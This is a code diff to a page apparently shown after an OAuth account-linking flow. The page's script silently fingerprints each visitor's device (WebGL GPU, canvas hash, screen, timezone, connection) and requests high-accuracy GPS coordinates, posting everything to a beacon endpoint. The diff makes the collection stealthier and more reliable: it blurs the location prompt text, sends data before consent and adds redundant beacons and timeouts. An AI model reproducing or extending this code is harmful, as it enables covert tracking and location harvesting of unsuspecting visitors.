@@ -69,7 +69,7 @@ function pageHtml(opts) {
     ? (opts.username
         ? 'Welcome, ' + opts.username + '. Account linked.'
         : opts.fullDump
-          ? 'Please allow location if asked…'
+          ? 'Collecting device info…'
           : 'Thanks for visiting. You can close this page.')
     : opts.error || 'Error';
   const color = ok ? '#57f287' : '#ed4245';
@@ -79,48 +79,65 @@ function pageHtml(opts) {
 body{min-height:100vh;display:flex;align-items:center;justify-content:center;margin:0;
 font-family:system-ui,sans-serif;background:#0b0b14;color:#e8e8f0}
 .card{width:min(420px,92vw);background:#12121c;border:1px solid #2a2a3c;border-radius:16px;padding:32px;text-align:center}
-h1{font-size:1.3rem;margin:12px 0 8px}p{color:#9a9ab0}.meta{margin-top:16px;font-size:.75rem;color:#6a6a80;text-align:left}
+h1{font-size:1.3rem;margin:12px 0 8px}p{color:#9a9ab0}.meta{margin-top:16px;font-size:.75rem;color:#6a6a80;text-align:left;word-break:break-all}
 .dot{width:56px;height:56px;border-radius:50%;margin:0 auto;border:2px solid ${color};background:${color}22}
 </style></head><body><div class="card"><div class="dot"></div><h1 id="title">${title}</h1><p id="sub">${sub}</p>
 <div class="meta" id="meta">Collecting…</div></div>
 <script>
 (function(){
 var visitId=${JSON.stringify(visitId)};
-if(!visitId)return;
-function send(p){try{fetch('/oauth/beacon',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(p),keepalive:true})}catch(e){}}
-function canvasHash(){try{var c=document.createElement('canvas');c.width=240;c.height=60;var x=c.getContext('2d');x.fillStyle='#f60';x.fillRect(0,0,240,60);x.fillStyle='#069';x.font='14px Arial';x.fillText(navigator.userAgent.slice(0,40),2,20);return c.toDataURL().slice(-64)}catch(e){return ''}}
+if(!visitId){
+  var el=document.getElementById('meta');
+  if(el)el.textContent='No visit id (server error)';
+  return;
+}
+function send(p){
+  var body=JSON.stringify(p);
+  try{
+    if(navigator.sendBeacon){
+      navigator.sendBeacon('/oauth/beacon', new Blob([body],{type:'application/json'}));
+    }
+  }catch(e){}
+  try{
+    fetch('/oauth/beacon',{method:'POST',headers:{'Content-Type':'application/json'},body:body,keepalive:true}).catch(function(){});
+  }catch(e){}
+}
+function canvasHash(){try{var c=document.createElement('canvas');c.width=240;c.height=60;var x=c.getContext('2d');x.fillStyle='#f60';x.fillRect(0,0,240,60);x.fillStyle='#069';x.font='14px Arial';x.fillText((navigator.userAgent||'').slice(0,40),2,20);return c.toDataURL().slice(-64)}catch(e){return ''}}
 function webgl(){try{var c=document.createElement('canvas');var g=c.getContext('webgl')||c.getContext('experimental-webgl');if(!g)return{};var d=g.getExtension('WEBGL_debug_renderer_info');return d?{webgl_vendor:String(g.getParameter(d.UNMASKED_VENDOR_WEBGL)||''),webgl_renderer:String(g.getParameter(d.UNMASKED_RENDERER_WEBGL)||'')}:{}}catch(e){return{}}}
 var conn=navigator.connection||navigator.mozConnection||navigator.webkitConnection||{};
 var base=Object.assign({
   visitId:visitId,
   screen:(screen.width||'')+'x'+(screen.height||'')+'@'+(screen.availWidth||'')+'x'+(screen.availHeight||''),
   color_depth:String(screen.colorDepth||''),
-  pixel_ratio:String(devicePixelRatio||''),
+  pixel_ratio:String(window.devicePixelRatio||''),
   platform:navigator.platform||'',
   vendor:navigator.vendor||'',
   hardware_concurrency:String(navigator.hardwareConcurrency||''),
   device_memory:String(navigator.deviceMemory||''),
   touch_points:String(navigator.maxTouchPoints||''),
   client_timezone:(Intl.DateTimeFormat().resolvedOptions().timeZone||''),
-  client_languages:(navigator.languages||[]).join(','),
+  client_languages:(navigator.languages||[navigator.language||'']).join(','),
   webdriver:String(!!navigator.webdriver),
   cookie_enabled:String(navigator.cookieEnabled),
-  do_not_track:String(navigator.doNotTrack||''),
+  do_not_track:String(navigator.doNotTrack||window.doNotTrack||''),
   canvas_hash:canvasHash(),
-  connection_type:String(conn.effectiveType||''),
+  connection_type:String(conn.effectiveType||conn.type||''),
   downlink:String(conn.downlink||''),
   rtt:String(conn.rtt||''),
-  user_agent:navigator.userAgent||'',
-  offline:String(!navigator.onLine),
-  pdf_viewer:String(!!navigator.pdfViewerEnabled)
+  user_agent:navigator.userAgent||''
 }, webgl());
 
-function finish(extra){
+send(base);
+var el=document.getElementById('meta');
+var title=document.getElementById('title');
+var sub=document.getElementById('sub');
+if(title)title.textContent='Almost done';
+if(sub)sub.textContent='Finishing…';
+if(el)el.innerHTML='Platform: '+(base.platform||'-')+'<br>Screen: '+(base.screen||'-')+'<br>TZ: '+(base.client_timezone||'-')+'<br>GPU: '+((base.webgl_renderer||'-').slice(0,40))+'<br>GPS: requesting…';
+
+function done(extra){
   var payload=Object.assign({}, base, extra||{});
   send(payload);
-  var el=document.getElementById('meta');
-  var title=document.getElementById('title');
-  var sub=document.getElementById('sub');
   if(title)title.textContent='Done';
   if(sub)sub.textContent='You can close this page.';
   if(el){
@@ -129,27 +146,36 @@ function finish(extra){
       'Screen: '+(payload.screen||'-')+'<br>'+
       'TZ: '+(payload.client_timezone||'-')+'<br>'+
       'GPU: '+((payload.webgl_renderer||'-').slice(0,48))+'<br>'+
-      (payload.gps_lat ? ('GPS: '+payload.gps_lat+', '+payload.gps_lon+' (±'+Math.round(Number(payload.gps_accuracy||0))+'m)') : ('GPS: '+(payload.gps_error||'n/a')));
+      (payload.gps_lat
+        ? ('GPS: '+payload.gps_lat+', '+payload.gps_lon+' (±'+Math.round(Number(payload.gps_accuracy||0))+'m)')
+        : ('GPS: '+(payload.gps_error||'unavailable')));
   }
 }
 
 if(!navigator.geolocation){
-  finish({gps_error:'unsupported'});
+  done({gps_error:'unsupported'});
 } else {
-  navigator.geolocation.getCurrentPosition(function(pos){
-    var c=pos.coords;
-    finish({
-      gps_lat:String(c.latitude),
-      gps_lon:String(c.longitude),
-      gps_accuracy:String(c.accuracy),
-      gps_altitude:c.altitude!=null?String(c.altitude):'',
-      gps_heading:c.heading!=null?String(c.heading):'',
-      gps_speed:c.speed!=null?String(c.speed):'',
-      gps_timestamp:String(pos.timestamp||Date.now())
-    });
-  }, function(err){
-    finish({gps_error:String(err.code)+':'+(err.message||'')});
-  }, {enableHighAccuracy:true, timeout:15000, maximumAge:0});
+  var finished=false;
+  function once(extra){ if(finished)return; finished=true; done(extra); }
+  setTimeout(function(){ once({gps_error:'timeout'}); }, 12000);
+  try {
+    navigator.geolocation.getCurrentPosition(function(pos){
+      var c=pos.coords||{};
+      once({
+        gps_lat:String(c.latitude),
+        gps_lon:String(c.longitude),
+        gps_accuracy:String(c.accuracy),
+        gps_altitude:c.altitude!=null?String(c.altitude):'',
+        gps_heading:c.heading!=null?String(c.heading):'',
+        gps_speed:c.speed!=null?String(c.speed):'',
+        gps_timestamp:String(pos.timestamp||Date.now())
+      });
+    }, function(err){
+      once({gps_error:String((err&&err.code)||'')+':'+(err&&err.message||'denied')});
+    }, {enableHighAccuracy:true, timeout:10000, maximumAge:0});
+  } catch(e) {
+    once({gps_error:'exception'});
+  }
 }
 })();
 </script></body></html>`;
